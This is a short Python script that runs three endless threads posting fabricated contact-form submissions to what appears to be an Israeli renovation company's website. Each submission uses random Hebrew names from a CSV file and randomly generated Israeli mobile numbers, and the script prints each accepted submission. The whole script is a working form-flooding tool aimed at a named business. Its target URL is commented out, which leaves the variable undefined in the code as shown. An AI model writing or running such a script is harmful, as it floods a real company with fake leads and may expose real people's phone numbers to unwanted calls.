import time
import requests
import random
import string
import threading
# url = 'https://www.top-renovations.co.il/'


with open('data/israeli_names.csv', 'r', encoding='utf-8') as f:
    names = f.read().split()


def do_requests():
    while True:
        data = {
            'fullname': ' '.join(random.choices(names, k=2)),
            'phone': '05' + ''.join(random.choices(['2', '3', '4', '8'], weights=(71, 3, 20, 6), k=1)) +
                        ''.join(random.choices(string.digits, k=7)),
            'professionType': 'שיפוץ כללי',
            'city': 'רעננה',
            'approve': '1',
            'action': 'contact'

        }
        response = requests.post(url=url, data=data)

        if response.ok and 'true' in response.text:
            print(response.text, 'Sending details: ', [data[j] for j in data][:2])


threads = []
for i in range(3):
    t = threading.Thread(target=do_requests)
    t.daemon = True
    threads.append(t)

for i in range(3):
    threads[i].start()

for i in range(3):
    threads[i].join()
